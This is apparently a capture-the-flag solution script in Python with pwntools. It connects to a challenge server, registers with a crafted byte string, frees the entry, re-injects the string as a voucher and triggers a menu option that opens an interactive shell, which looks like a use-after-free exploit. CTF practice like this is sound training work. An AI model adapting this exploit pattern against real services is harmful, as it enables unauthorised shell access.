from pwn import process, remote, gdb


def debug(proc):
    p = process(proc, level="debug")
    gdb.attach(p)
    return p


HOST = 'ctf-challs.sinf.pt'
PORT = 1340
# io = debug("./hot")
io = remote(HOST, PORT, level='debug')


injection = '\x65\x7a\x70\x7a' * 17


def register():
    io.recvuntil("desired option:")
    io.sendline("1")
    io.recvuntil("Name: ")
    io.sendline(injection)
    io.recvuntil("Email: ")
    io.sendline(injection)


def free():
    io.recvuntil("desired option:")
    io.sendline("3")


def inject():
    io.recvuntil("desired option:")
    io.sendline("4")
    io.recvuntil("voucher: ")
    io.sendline(injection)


def start_shell():
    io.recvuntil("desired option:")
    io.sendline("5")


register()
free()
inject()
start_shell()
io.interactive()
